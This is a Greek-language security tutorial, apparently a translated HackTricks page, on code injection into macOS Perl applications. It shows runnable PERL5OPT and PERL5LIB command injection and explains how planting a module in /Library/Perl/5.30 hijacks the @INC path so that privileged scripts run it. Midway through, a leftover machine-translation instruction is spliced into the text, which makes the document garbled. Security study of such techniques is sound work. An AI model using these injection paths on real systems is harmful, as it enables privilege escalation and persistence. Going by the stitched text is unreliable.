# Εισαγωγή κώδικα

Μέσω της μεταβλητής περιβάλλοντος PERL5OPT είναι δυνατή η εκτέλεση αυθαίρετων εντολών στην Perl.\
Για παράδειγμα, δημιουργήστε αυτό το σενάριο:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Τώρα **εξαγάγετε τη μεταβλητή περιβάλλοντος** και εκτελέστε το **perl** script:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα Perl module (π.χ. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές περιβάλλοντος:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Μέσω εξαρτήσεων

Είναι δυνατόν να αναφέρουμε τη σειρά του φακέλου εξαρτήσεων της εκτέλεσης του Perl:
```bash
perl -e 'print join("\n", @INC)'
```
Το ακόλουθο είναι περιεχόμενο από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το ακόλουθο περιεχόμενο είναι από το αρχείο /hive/hacktricks/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md. Μεταφράστε το σχετικό αγγλικό κείμενο στα ελληνικά και επιστρέψτε τη μετάφραση διατηρώντας ακριβώς την ίδια σύνταξη markdown και html. Μην μεταφράζετε πράγματα όπως κώδικας, ονόματα τεχνικών χάκινγκ, χάκινγκ λέξεις, ονόματα cloud/SaaS πλατφορμών (όπως Workspace, aws, gcp...), η λέξη 'διαρροή', pentesting και ετικέτες markdown. Επίσης, μην προσθέτετε κανένα επιπλέον περιεχόμενο εκτός από τη μετάφραση και τη σύνταξη markdown.
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Ορισμένοι από τους επιστρεφόμενους φακέλους δεν υπάρχουν καν, ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, δεν είναι προστατευμένο από το **SIP** και βρίσκεται **πριν** από τους φακέλους που προστατεύονται από το SIP. Επομένως, κάποιος μπορεί να καταχραστεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε σενάρια Perl υψηλής προνομιούχου εκτέλεσης.

{% hint style="warning" %}
Ωστόσο, σημειώστε ότι **χρειάζεστε δικαιώματα root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτήν την **ειδοποίηση TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Για παράδειγμα, αν ένα σενάριο εισάγει το **`use File::Basename;`**, θα ήταν δυνατόν να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελεστεί αυθαίρετος κώδικας.

## Αναφορές

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>
